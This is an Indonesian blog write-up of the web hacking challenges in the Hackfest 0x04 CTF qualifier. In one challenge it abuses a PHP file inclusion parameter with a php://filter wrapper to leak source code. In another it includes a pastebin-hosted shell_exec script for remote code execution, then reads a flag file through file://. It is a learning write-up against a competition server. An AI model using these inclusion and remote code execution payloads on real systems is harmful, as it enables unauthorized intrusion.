---
date: 2021-04-01T20:40:20+07:00
title: "Writeup Kualifikasi CTF Hackfest 0x04 Web Hacking"
slug: "writeup-kualifikasi-ctf-hackfest-0x04-web-hacking"
description: "WriteUp saya dalam acara CTF Hackfest Cyber Community Universitas Gunadarma (CCUG)."
---

Hackfest merupakan acara yang diselenggarakan oleh Cyber Community Unversitas Gunadarma (CCUG) untuk merekrut anggota baru untuk masuk ke tim mereka. Kebetulan saya mengikuti Hackfest 0x04. Berikut ini adalah writeup saya dalam menjawab soal-soal CTF Hackfest 0x04. Akan tetapi tidak semua writeup saya tulis, hanya kategori Web Hacking saja 😸

## Bayi IE
```
Ezz Parah Gak Usah Nanya (1)
http://ccug.my.id:22121/
Author: Ikhari
```
Saya membuka URL yang disediakan di soal, didapatkan tampilan seperti ini:

![Tampilan Web](Bayi_IE.png)

Setelah itu, saya mencoba melihat page source dengan cara menekan CTRL + U. Didapatkan 1/3 dari flag seperti ini:

![Source code](Bayi_IE_2.png)

Karena itu masih 1/3 bagian alias belum penuh, maka saya memutuskan untuk mencari lagi. Saya mencoba melihat file-file yang dimasukkan ke sini, yaitu semua css dan js. Lalu saya menemukan flag ke 2/3 di dalam file vegas.min.js

![vegas.min.js](Bayi_IE_3.png)

Saya juga menemukan flag ke 3/3 di dalam file templatemo-file.css

![templatemo-file.css](Bayi_IE_4.png)

Sehingga, flagnya dapat digabungkan dan dihasilkan:

`hackfest{IE_AdAlaH_Hal_PaLiNg_pEnTing_DAlaM_menCARI_iNfo}`

## Where Are You Now?
```
Hehehe boi
http://ccug.my.id:20000/
Author: aldo
```
Saya membuka URL yang disediakan di soal, didapatkan tampilan seperti ini:

![Tampilan awal](Where_Are_You_Now.png)

Saya membuka menu Flag, didapatkan tampilan seperti ini:

![Halaman Flag](Where_Are_You_Now_2.png)

Lalu, saya melihat URLnya, didapatkan URL seperti ini:

http://ccug.my.id:20000/index.php?page=flag.php

Saya berasumsi bahwa terdapat celah di bagian "page=", yang mana bagian method get tersebut akan memasukkan file php sesuai dengan nama yang dimasukkan di URL. Sehingga, saya mencoba memasukkan PHP Wrapper menjadi seperti ini:

http://ccug.my.id:20000/index.php?page=php://filter/convert.base64-encode/resource=flag.php

Didapatkan hasil seperti ini:

![Source flag.php tapi dihash base64](Where_Are_You_Now_3.png)

Karena masih menggunakan base64, akhirnya saya membuat script Python sederhana untuk menerjemahkan base64 tersebut:

![Script Python3](Where_Are_You_Now_4.png)

Jalankan scriptnya dan dapat deh flagnya:

![Output](Where_Are_You_Now_5.png)

`hackfest{tau_kan_harus_diapain_nih_flag?_ya_disubmit_lah:)}`

## eRFI Minta Tolong
```
Flag jauh dari apa yang kamu liat:*
http://ccug.my.id:20001/
Author: aldo
```
Saya membuka URL yang disediakan di soal, didapatkan tampilan seperti ini:

![Tampilan awal](eRFI_Minta_Tolong.png)

Saya mencoba cara yang sama seperti soal "Where Are You Now?", dan didapatkan hasil seperti ini:

![Output](eRFI_Minta_Tolong_2.png)

Karena bukan itu flagnya, maka saya mencoba cara lain, yaitu dengan cara eksekusi shell. Kenapa eksekusi shell? Karena di soalnya judulnya 'RFI' atau _Remote File Inclusion_, singkatnya RFI ini bisa membuat penyerang mengakses server korbannya. Saya membuat script php sederhana untuk eksekusi shell, menggunakan pastebin:
```
<pre>

<?php

echo shell_exec("ls /");

?>

</pre>
```

Setelah itu link raw dari pastebin saya masukkan sebagai parameter pada method "page="

http://ccug.my.id:20001/index.php?page=https://pastebin.com/raw/sju0u1WZ

Didapatkan tampilan seperti ini, di mana ini adalah list direktori dari root "/":

![Direktori Root](eRFI_Minta_Tolong_3.png)

Di sana terdapat file flagnya, sekarang tinggal dibaca menggunakan file wrapper yang dimasukkan sebagai parameter juga.

http://ccug.my.id:20001/index.php?page=file:///1Ni_fL4g_eUy.txt

Didapatkan flagnya:

`hackfest{widihhh_mantep_euy_tau_aja_ada_disini}`

## Bayi Kepala
```
Ezz Parah Gak Usah Nanya (2)
http://ccug.my.id:22122/
Author: Ikhari
```
Saya mencoba mengakses url di soal menggunakan API Client Insomnia, lalu memeriksa bagian headersnya. Dan ditemukan flagnya.

![Insomnia](Bayi_Kepala.png)

`hackfest{YOU_EXPECTED_FLAG_!_BUT_IT_WAS_ME_DIO_!!!}`

## Bayi Robot
```
Ezz Parah Gak Usah Nanya (3)
http://ccug.my.id:22123/
Author: Ikhari
```
Saya mencoba mengakses url di soal lalu membuka robots.txt, dan didapatkan hasil seperti ini:

![Robots.txt](Bayi_Robot.png)

Setelah itu, saya membuka satu-satu filenya. Dan pada file NoRobotHere.txt saya mendapatkan kode base64:

![NoRobotHere.txt](Bayi_Robot_2.png)

Lalu encode base64 tersebut dan didapatkan flagnya:

`hackfest{FlaG_HAck_FeSt_0xo4}`

Sekian writeup dari saya, semoga bisa menambah ilmu teman-teman semua 😁
